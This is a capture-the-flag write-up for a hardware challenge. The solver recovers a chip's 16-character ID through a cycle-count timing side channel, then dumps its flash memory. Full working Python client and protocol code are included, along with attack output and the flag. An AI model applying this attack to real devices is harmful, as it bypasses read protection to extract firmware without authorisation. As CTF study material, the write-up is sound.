---
title: FCSIGN
solves: 3
points: 500
created: 2025-04-19T21:18
updated: 2025-04-20T19:59
---

After reading the datasheet I can tell that the most important part of this challenge is the 16 byte password.

> An ID can be used to secure your processor. This is a 16 byte ID consisting of CAPITAL alphabetical characters 'A' through 'Z'. If a user attempts to bruteforce this password, the chip will be erased, preserving the contents.

```python
async def receive_data(socket):
    response = await socket.recv()
    message = json.loads(response)
    return base64.b64decode(message['data']), message['cycles']
```

Since each response includes the number of cycles used, I immediately tried using it to guess the password character by character. And it worked.

Most string comparisons go left to right, and return early on error. So if there are more correct characters on the left, it will take the board longer to return.

```
...
[/] R : delta = 15500 cycles
[/] Q : delta = 15500 cycles
[/] P : delta = 16000 cycles
[/] O : delta = 15250 cycles
[/] N : delta = 15250 cycles
[/] M : delta = 15250 cycles
...
[*] max char: P (16000 cycles)
```

Afterwards I simply follow the datasheet and request `0x400` byte chunks until the board does not respond with one.

```
...
[+] Read 0x400 bytes from 0xed400
[+] Read 0x400 bytes from 0xed800
[-] READ failed at 0xedc00: INVALID_ADDRESS
Stopped at 0xedc00 with status INVALID_ADDRESS
Total bytes read: 962560
[*] Dump saved to dump.bin
```

## extraction
![image.png](https://res.cloudinary.com/kumonochisanaka/image/upload/v1745115389/2025/04/bb1d32ca1c01d507bf08bcfd9f51f776.png)

Couldn't tell what the file really is, but I see PNG headers and a bunch of plain text. So I did a `binwalk -Me` on it.

```sh
binwalk -Me dump.bin
```

And one of the image frames contained the flag.

![image.png](https://res.cloudinary.com/kumonochisanaka/image/upload/v1745114781/2025/04/d1441cc929061d4350d9d8e7c9a8f365.png)

Not sure why this challenge has so little solves, just follow the instructions.
## solve

```flag
UMASS{un(_b3_w1l1n_w1th_s1d3ch4nn3l1n_XT60WWSC}
```

```python [client.py]
import asyncio
import json
import base64
import string
import websockets
from comm import encode_packet, decode_packet, COMMANDS, RESPONSES

URL = 'ws://hardware.ctf.umasscybersec.org:10004'


async def send_raw(ws, data: bytes):
    env = json.dumps({'data': base64.b64encode(data).decode()})
    # print(f">>> {data.hex()}")
    await ws.send(env)


async def recv_pkt(ws):
    msg = await ws.recv()
    obj = json.loads(msg)
    raw = base64.b64decode(obj['data'])
    # print(f"<<< {raw.hex()}")
    info = decode_packet(raw)
    return info, obj.get('cycles')


async def dump_until_fail(ws):
    data = bytearray()
    addr = 0
    while True:
        pkt = encode_packet(COMMANDS.READ, addr.to_bytes(4, 'little'))
        await send_raw(ws, pkt)
        resp, _ = await recv_pkt(ws)
        status = resp['status']
        if status != RESPONSES.ACK:
            print(f"[-] READ failed at {hex(addr)}: {status.name}")
            return data, addr, status
        data.extend(resp['args'])
        print(f"[+] Read 0x400 bytes from {hex(addr)}")
        addr += 0x400


async def main():
    ws = await websockets.connect(URL)
    await send_raw(ws, b'\x55\x00\xC1\x00')
    resp, _ = await recv_pkt(ws)
    assert resp['status'] == RESPONSES.ACK

    await send_raw(ws, encode_packet(COMMANDS.COMM_INIT))
    resp, _ = await recv_pkt(ws)
    assert resp['status'] == RESPONSES.ACK

    freq = (8_000_000).to_bytes(4, 'little')
    await send_raw(ws, encode_packet(COMMANDS.SET_CHIP_FREQ, freq))
    resp, _ = await recv_pkt(ws)
    assert resp['status'] == RESPONSES.ACK

    known = b''
    while len(known) < 16:
        last_c = _
        count = {}
        for l in reversed(string.ascii_uppercase):
            pwd = known+l.encode() + b'A'*(15-len(known))
            await send_raw(ws, encode_packet(COMMANDS.ID_AUTHENTICATION, pwd))
            resp, _ = await recv_pkt(ws)
            print(f"[/] {l} : delta = {_-last_c} cycles")
            count[l] = _-last_c
            last_c = _
        max_char = max(count, key=count.get)
        print(f"[*] max char: {max_char} ({count[max_char]} cycles)")
        known += max_char.encode()
        print(f"[*] known: {known.decode()}")
    await send_raw(ws, encode_packet(COMMANDS.ID_AUTHENTICATION, known))
    resp, _ = await recv_pkt(ws)
    print(f"[*] ID_AUTHENTICATION: {resp['status']}")

    full_dump, fail_addr, fail_status = await dump_until_fail(ws)
    print(f"Stopped at {hex(fail_addr)} with status {fail_status.name}")
    print(f"Total bytes read: {len(full_dump)}")

    with open('dump.bin', 'wb') as f:
        f.write(full_dump)
    print(f"[*] Dump saved to dump.bin")

if __name__ == '__main__':
    asyncio.run(main())
```

```python [comm.py]
import struct
from enum import IntEnum


class COMMANDS(IntEnum):
    UNKNOWN = 0x00
    COMM_INIT = 0x03
    SET_CHIP_FREQ = 0x05
    ID_AUTHENTICATION = 0x34
    READ = 0x69


class RESPONSES(IntEnum):
    ACK = 0x50
    INVALID_COMMAND = 0x80
    FLOW_ERROR = 0x81
    UNAUTHORIZED = 0x82
    INVALID_FREQUENCY = 0x83
    INVALID_ID_LEN = 0x84
    INVALID_ADDRESS = 0x87
    INVALID_ADDRESS_ALIGNMENT = 0x88


def encode_packet(cmd: COMMANDS, args: bytes = b'') -> bytes:
    """
    Build a UK47XD packet for sending.

    Packet layout:
      HEAD  (1B)   = 0x33
      LEN   (2B)   = size of DATA (CMD + ARGS)
      DATA (N bytes) = CMD (1B) + ARGS
    """
    head = 0x33
    length = 1 + len(args)  # 1 byte for CMD + len(args)
    return struct.pack('<B H B', head, length, cmd) + args


def decode_packet(pkt: bytes) -> dict:
    """
    Parse a UK47XD packet into its fields.

    Expects at least 5 bytes: HEAD (1) + LEN (2) + CMD (1) + STATUS (1).
    Any remaining bytes are ARGS.
    """
    if len(pkt) < 5:
        raise ValueError("Packet too short to be valid")

    head, length = struct.unpack_from('<B H', pkt, 0)
    if head != 0x33:
        raise ValueError(f"Invalid HEAD byte: 0x{head:02X}")

    expected_len = 3 + length  # 1B HEAD + 2B LEN + length
    if len(pkt) != expected_len:
        raise ValueError(f"Length mismatch: expected {expected_len} bytes, got {len(pkt)}")

    cmd = COMMANDS(pkt[3])
    status = RESPONSES(pkt[4])
    args = pkt[5:]

    return {
        'head':   head,
        'length': length,
        'cmd':    cmd,
        'status': status,
        'args':   args,
    }
```
